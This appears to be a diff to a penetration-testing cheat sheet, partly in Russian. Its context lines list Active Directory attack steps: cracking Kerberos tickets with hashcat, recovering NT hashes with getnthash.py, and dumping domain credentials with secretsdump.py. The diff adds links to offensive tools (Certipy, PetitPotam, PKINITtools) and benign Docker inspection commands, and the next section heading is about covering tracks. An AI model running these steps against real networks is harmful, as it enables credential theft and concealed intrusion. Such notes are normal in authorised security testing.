@@ -216,7 +216,12 @@ for i in $(find -name '*.txt'); do hashcat -m 13100 --force tgt_ticket.txt "$i";
 - [ ] export KRB5CCNAME=host.ccache
 - [ ] python3 getnthash.py domain.local/dc\$ -key as-rep-key*
 - [ ] python3 secretsdump.py –hashes ':nt-hash' 'trust.localhost/dc:$@dc-ip' –just-dc-user user*
+
 ```
+https://github.com/ly4k/Certipy
+https://github.com/topotam/PetitPotam
+https://github.com/dirkjanm/PKINITtools/tree/master
+https://github.com/dirkjanm/PKINITtools/blob/master/getnthash.py
 ```
 
 **FTP**
@@ -403,6 +408,17 @@ apt-get install terminator -y
 apt install docker.io -y
 ```
 
+## Docker
+
+```
+docker ps
+docker images
+docker exec -it <container_id> netstat -tulpn
+docker logs <service_name>
+docker inspect <service_name>
+docker-compose ps --services
+dockerd (error logs)
+```
 ## Скрытие следов
 
 Windows
